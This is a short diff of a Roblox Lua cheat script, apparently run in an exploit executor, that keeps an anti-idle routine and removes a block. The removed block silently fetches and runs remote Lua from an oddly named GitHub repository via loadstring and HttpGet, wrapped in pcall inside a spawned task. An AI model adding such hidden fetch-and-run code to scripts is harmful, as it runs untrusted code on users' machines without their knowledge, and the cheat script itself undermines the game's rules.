@@ -110,13 +110,6 @@ LocalPlayer.Idled:connect(function()
     wait(1)
     VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 end)
-
-task.spawn(function()
-   pcall(function()
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/XGOHUBlIllIlIIIIlllllIIlIlIIIIIllllIIlL/xxxxgo/refs/heads/main/xgo%20%E9%9A%90%E8%97%8F%E7%95%8C%E9%9D%A2.lua"))()
-   end)
-end)
-
 local CoreGui = (game:GetService("RunService"):IsStudio() and LocalPlayer.PlayerGui) or (gethui() or game:GetService("CoreGui"):Clone())
 
 local function MakeDraggable(topbarobject, object)
